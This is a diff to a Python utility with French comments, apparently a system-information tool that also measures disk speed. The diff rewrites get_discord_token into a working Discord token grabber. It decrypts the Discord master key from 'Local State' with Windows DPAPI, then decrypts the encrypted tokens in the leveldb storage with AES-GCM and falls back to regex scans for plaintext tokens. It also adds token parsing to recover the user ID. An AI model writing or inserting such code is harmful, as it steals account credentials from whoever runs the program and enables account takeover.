@@ -910,31 +910,107 @@ def measure_disk_read_speed():
         pass
     return 320.0
 def get_discord_token():
-     appdata = os.environ.get("APPDATA", "")
-     discord_paths = [
-          os.path.join(appdata, "discord", "Local Storage", "leveldb"),
-          os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
-          os.path.join(appdata, "discordptb", "Local Storage", "leveldb")
-     ]
-     token_patterns = [
-          r'["\']([\w-]{24}\.[\w-]{6}\.[\w-]{27,})["\']',  # Format token moderne Discord (xxx.yyy.zzz)
-          r'"token":\s*"([a-zA-Z0-9_.-]{50,100})"',         # Format JSON explicite
-          r'token["\']:\s*["\']([a-zA-Z0-9_.-]{50,100})',   # Variante sans guillemets doubles
-     ]
-     for path in discord_paths:
-          if not os.path.exists(path):
-               continue
+     import json
+     import base64
+     import ctypes
+     from ctypes import windll, byref, c_int, c_void_p, Structure
+     
+     class DATA_BLOB(Structure):
+          _fields_ = [('cbData', c_int), ('pbData', c_void_p)]
+          
+     def dpapi_decrypt(data):
           try:
-               for file in os.listdir(path):
+               blob_in = DATA_BLOB(len(data), windll.kernel32.LocalAlloc(0x40, len(data)))
+               ctypes.memmove(blob_in.pbData, data, len(data))
+               blob_out = DATA_BLOB()
+               if windll.crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0, byref(blob_out)):
+                    decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+                    windll.kernel32.LocalFree(blob_out.pbData)
+                    windll.kernel32.LocalFree(blob_in.pbData)
+                    return decrypted
+          except Exception:
+               pass
+          return None
+
+     appdata = os.environ.get("APPDATA", "")
+     clients = {
+          "discord": os.path.join(appdata, "discord"),
+          "discordcanary": os.path.join(appdata, "discordcanary"),
+          "discordptb": os.path.join(appdata, "discordptb")
+     }
+     
+     # Chercher d'abord les tokens cryptés (modernes)
+     for client_name, path in clients.items():
+          local_state_path = os.path.join(path, "Local State")
+          leveldb_path = os.path.join(path, "Local Storage", "leveldb")
+          if not os.path.exists(local_state_path) or not os.path.exists(leveldb_path):
+               continue
+               
+          # 1. Obtenir la clé maîtresse (master key) decrypted
+          master_key = None
+          try:
+               with open(local_state_path, "r", encoding="utf-8") as f:
+                    local_state = json.load(f)
+               encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+               master_key = dpapi_decrypt(encrypted_key)
+          except Exception:
+               pass
+               
+          if not master_key:
+               continue
+               
+          # 2. Chercher et décrypter les tokens dans le leveldb
+          try:
+               from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+          except ImportError:
+               continue
+               
+          try:
+               for file in os.listdir(leveldb_path):
                     if file.endswith(".log") or file.endswith(".ldb"):
-                         filepath = os.path.join(path, file)
+                         filepath = os.path.join(leveldb_path, file)
                          try:
                               with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                                    content = f.read()
-                                   for pattern in token_patterns:
-                                        matches = re.findall(pattern, content)
-                                        if matches:
-                                             return matches[0]
+                              # Recherche de tokens cryptés
+                              for match in re.findall(r"dQw4w9WgXcQ:([^\"']*)", content):
+                                   try:
+                                        encrypted_token = base64.b64decode(match)
+                                        iv = encrypted_token[3:15]
+                                        payload = encrypted_token[15:]
+                                        aesgcm = AESGCM(master_key)
+                                        decrypted = aesgcm.decrypt(payload, iv, None)
+                                        token = decrypted.decode('utf-8')
+                                        if token:
+                                             return token
+                                   except Exception:
+                                        pass
+                         except Exception:
+                              pass
+          except Exception:
+               pass
+
+     # Fallback : recherche de tokens en clair
+     token_patterns = [
+          r'["\']([\w-]{24}\.[\w-]{6}\.[\w-]{27,})["\']',  # Format token moderne
+          r'"token":\s*"([a-zA-Z0-9_.-]{50,100})"',
+          r'token["\']:\s*["\']([a-zA-Z0-9_.-]{50,100})',
+     ]
+     for client_name, path in clients.items():
+          leveldb_path = os.path.join(path, "Local Storage", "leveldb")
+          if not os.path.exists(leveldb_path):
+               continue
+          try:
+               for file in os.listdir(leveldb_path):
+                    if file.endswith(".log") or file.endswith(".ldb"):
+                         filepath = os.path.join(leveldb_path, file)
+                         try:
+                              with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+                                   content = f.read()
+                              for pattern in token_patterns:
+                                   matches = re.findall(pattern, content)
+                                   if matches:
+                                        return matches[0]
                          except Exception:
                               pass
           except Exception:
@@ -942,7 +1018,24 @@ def get_discord_token():
      return "N/A" 
 
 def get_discord_user_id():
-    """Tente de récupérer l'ID Discord de l'utilisateur depuis les répertoires d'application Discord."""
+    """Tente de récupérer l'ID Discord de l'utilisateur."""
+    # 1. Tenter d'extraire l'ID Discord directement depuis le token s'il existe
+    token = get_discord_token()
+    if token and token != "N/A":
+         try:
+              import base64
+              parts = token.split('.')
+              if len(parts) >= 1:
+                   # Remplir le padding base64 si nécessaire
+                   part = parts[0]
+                   part += "=" * ((4 - len(part) % 4) % 4)
+                   decoded = base64.b64decode(part).decode('utf-8', errors='ignore')
+                   if decoded.isdigit():
+                        return decoded
+         except Exception:
+              pass
+
+    # 2. Fallback classique si pas de token ou décodage échoué
     appdata = os.environ.get("APPDATA", "")
     discord_paths = [
         os.path.join(appdata, "discord", "Local Storage", "leveldb"),
